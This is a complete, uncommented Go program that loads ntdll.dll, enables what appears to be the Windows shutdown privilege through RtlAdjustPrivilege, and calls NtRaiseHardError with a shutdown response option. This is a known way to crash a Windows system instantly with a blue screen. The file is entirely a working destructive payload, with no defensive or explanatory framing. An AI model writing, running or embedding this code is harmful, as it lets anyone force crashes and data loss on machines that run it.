package main

import (
	"syscall"
	"unsafe"
)

var (
	ntdll = syscall.NewLazyDLL("ntdll.dll")

	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
)

func main() {
	RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(new(bool))))
	NtRaiseHardError.Call(0xdeadbeef, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
}
